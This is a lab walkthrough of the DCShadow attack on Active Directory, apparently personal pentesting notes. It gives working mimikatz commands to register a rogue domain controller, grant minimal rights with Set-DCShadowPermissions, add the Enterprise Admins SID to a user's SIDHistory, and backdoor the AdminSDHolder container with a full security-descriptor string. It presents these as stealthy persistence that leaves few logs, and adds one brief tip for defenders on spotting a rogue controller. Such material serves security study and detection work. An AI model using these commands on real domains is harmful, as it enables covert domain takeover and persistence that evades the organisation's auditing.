# DCShadow Attack

![DCShadow%20Attack/Untitled.png](DCShadow%20Attack/Untitled.png)

# Explanation

⇒ DCShadow is late-stage kill chain attack that allows an attacker with **SYSTEM** privilege on a machine to register as a rogue domain controller and push changes to a domain. You either need Domain Admin or the following rights to push changes to the domain  :

- Domain Object :
    - DS-Replication-Manage-Topology
    - DS-Install-Replica
    - DS-Replication-Synchronize
- Site Object :
    - CreateChild
    - DeleteChild
- Computer Object ( Rogue DC ) :
    - WriteProperty
- Target Object :
    - WriteProperty

⇒ So to set these ACLs there's a powershell script named **[Set-DCShadowPermissions](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1)** which is used to modify AD objects to provide minimal permissions required for DCShadow.

⇒ The reason this attack is great for persistence is because there are no changelogs showed in the event viewer when we modify an object ACL which is great to hide our tracks 🙂 .

---

# Performing The Attack

---

## Prerequisites

- **SYSTEM** on a machine
- **Domain Admin** account
- **[mimikatz](https://github.com/gentilkiwi/mimikatz)**

---

## Modifying an object attribute

⇒ First lets get mimikatz fired up for the attack :

- [ SYSTEM ]

![DCShadow%20Attack/Untitled%201.png](DCShadow%20Attack/Untitled%201.png)

- [ Domain Administrator ]

![DCShadow%20Attack/Untitled%202.png](DCShadow%20Attack/Untitled%202.png)

⇒ So next we will be modifying an user's object description attribute :

- [System]

```powershell
lsadump::dcshadow /object:test1 /attribute:Description /value="DCShadow works eh"
```

![DCShadow%20Attack/Untitled%203.png](DCShadow%20Attack/Untitled%203.png)

- [Domain Admin]

```powershell
lsadump::dcshadow /push
```

![DCShadow%20Attack/Untitled%204.png](DCShadow%20Attack/Untitled%204.png)

- Checking the user description with **PowerView** to confirm we did modify user description attribute :

![DCShadow%20Attack/Untitled%205.png](DCShadow%20Attack/Untitled%205.png)

### ⇒ Defender's perspective :

- Taking a look at Event Viewer in vDC01 ( Domain Controller ) to check for change logs :

![DCShadow%20Attack/Untitled%206.png](DCShadow%20Attack/Untitled%206.png)

- The only changelog here is the one showed in the screenshot, but doesn't show any logs that says we modified test1 object attribute.
- Although we do notice the following GUID [ **`E3514235–4B06–11D1-AB04–00C04FC2DCD2`** ] in the above changelog which basically signifies that this machine is a Domain Controller :

![DCShadow%20Attack/Untitled%207.png](DCShadow%20Attack/Untitled%207.png)

- So as a defender if u see an machine being assigned the following **GUID** and is not in the **Domain Controller Organizational Unit**, it is more likely an rogue domain controller.

---

## Performing DCShadow with minimal permissions

⇒ So in this example we won't be needing domain admin to push changes to the domain. We will be giving the minimal permissions needed using **[Set-DCShadowPermissions.ps1](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) :**

- So we will be giving permissions to user **naqi** to modify **test1** object from machine **IIS01**

```powershell
Set-DCShadowPermissions -FakeDC IIS01 -SAMAccountName test1 -Username naqi -Verbose
```

![DCShadow%20Attack/Untitled%208.png](DCShadow%20Attack/Untitled%208.png)

⇒ Firing up **[mimikatz](https://github.com/gentilkiwi/mimikatz)** as **SYSTEM** and **Naqi** :

![DCShadow%20Attack/Untitled%209.png](DCShadow%20Attack/Untitled%209.png)

- [ **SYSTEM** ]

```powershell
lsadump::dcshadow /object:test1 /attribute:Description /value="Noice m8"
```

- [ **NAQI** ]

```powershell
lsadump::dcshadow /push
```

![DCShadow%20Attack/Untitled%2010.png](DCShadow%20Attack/Untitled%2010.png)

- Confirming the changes using PowerView :

![DCShadow%20Attack/Untitled%2011.png](DCShadow%20Attack/Untitled%2011.png)

---

## Setting SIDHistory

⇒  SID History enables access for another account to effectively be cloned to another this is useful to ensure users retain access when migrating to different domain . 

⇒ We can set **SIDHistory** of an user account to **Domain Admin / Enterprise Admin** group **SID** which would give the user the privileges of the group we set in the **SIDHistory**. 

⇒ The reason this is much better than just adding a user to the group directly is :

- **SIDHistory** works for SIDs in the same domain as it does across domains in the same forest
- It is more sneaky and not so easy to spot as compared to modifying **primaryGroupID** attribute.

⇒ We will be modifying the **SIDHistory** attribute for the user **test1** to **Enterprise Admin** group **SID** which is :

![DCShadow%20Attack/Untitled%2012.png](DCShadow%20Attack/Untitled%2012.png)

- Lets get root domain **SID** and add **`-519`** to it , which will be Enterprise Admins group **SID** :

![DCShadow%20Attack/Untitled%2013.png](DCShadow%20Attack/Untitled%2013.png)

Enterprise Admins : **`S-1-5-21-1710056623-765944083-1957563412-519`**

- Next lets fire up **mimikatz** :

![DCShadow%20Attack/Untitled%2014.png](DCShadow%20Attack/Untitled%2014.png)

- [ **SYSTEM** ]

```powershell
lsadump::dcshadow /object:test1 /attribute:SIDHistory /value:S-1-5-21-1710056623-765944083-1957563412-519
```

- [ **NAQI** ]

```powershell
lsadump::dcshadow /push
```

![DCShadow%20Attack/Untitled%2015.png](DCShadow%20Attack/Untitled%2015.png)

- Confirming the changes using **PowerView** :

![DCShadow%20Attack/Untitled%2016.png](DCShadow%20Attack/Untitled%2016.png)

---

## AdminSDHolder

⇒ **AdminSDHolder** is a container in AD that holds the Security Descriptor applied to members of protected groups.

- **AdminSDHolder** container can be abused by backdooring it by giving your user **GenericAll** privileges, which effectively makes that user a **Domain Admin.**

- First we will enumerate the current **ACLs** for **AdminSDHolder**

```powershell
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=AdminSDHolder,CN=System,DC=endark,DC=local")).psbase.ObjectSecurity.sddl
```

![DCShadow%20Attack/Untitled%2017.png](DCShadow%20Attack/Untitled%2017.png)

**`(A;;CCDCLCSWRPWPLOCRSDRCWDWO;;;<USERSID>)`**

- Now lets grab our user **SID** :

![DCShadow%20Attack/Untitled%2018.png](DCShadow%20Attack/Untitled%2018.png)

**`(A;;CCDCLCSWRPWPLOCRSDRCWDWO;;;S-1-5-21-1710056623-765944083-1957563412-1118)`**

⇒ Next we will fire up **mimikatz** :

![DCShadow%20Attack/Untitled%2019.png](DCShadow%20Attack/Untitled%2019.png)

⇒ We will be modifying the **ntSecurityDescriptor** attribute to add our **ACL** to it :

- **[ SYSTEM ]**

```powershell
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=endark,DC=local /attribute:ntSecurityDescriptor /value:O:DAG:DAD:PAI(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;;CCDCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPLOCRRCWDWO;;;DA)(A;;CCDCLCSWRPWPLOCRRCWDWO;;;S-1-5-21-1710056623-765944083-1957563412-519)(OA;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;WD)(OA;CI;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(OA;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;PS)(OA;;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;;RP;037088f8-0ae1-11d2-b422-00a0c968f939;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;RP;4c164200-20c0-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;;RP;46a9b11d-60ae-405a-b7e8-ff8a58d456d2;;S-1-5-32-560)(OA;;RPWP;6db69a1c-9422-11d1-aebd-0000f80367c1;;S-1-5-32-561)(OA;;RPWP;5805bc62-bdc9-4428-a5e2-856a0f4c185e;;S-1-5-32-561)(OA;;RPWP;bf967a7f-0de6-11d0-a285-00aa003049e2;;CA)**(A;;CCDCLCSWRPWPLOCRSDRCWDWO;;;S-1-5-21-1710056623-765944083-1957563412-1118)**
```

- [ **Domain Admin** ]

```powershell
lsadump::dcshadow /push
```

![DCShadow%20Attack/Untitled%2020.png](DCShadow%20Attack/Untitled%2020.png)

⇒ We see that the user **test1** has the following rights on **AdminSDHolder** container :

![DCShadow%20Attack/Untitled%2021.png](DCShadow%20Attack/Untitled%2021.png)

---

References : [https://adsecurity.org/?p=1772](https://adsecurity.org/?p=1772) , [https://www.youtube.com/watch?v=ZPsC_DkR_PI](https://www.youtube.com/watch?v=ZPsC_DkR_PI) , [https://adsecurity.org/?p=1906](https://adsecurity.org/?p=1906)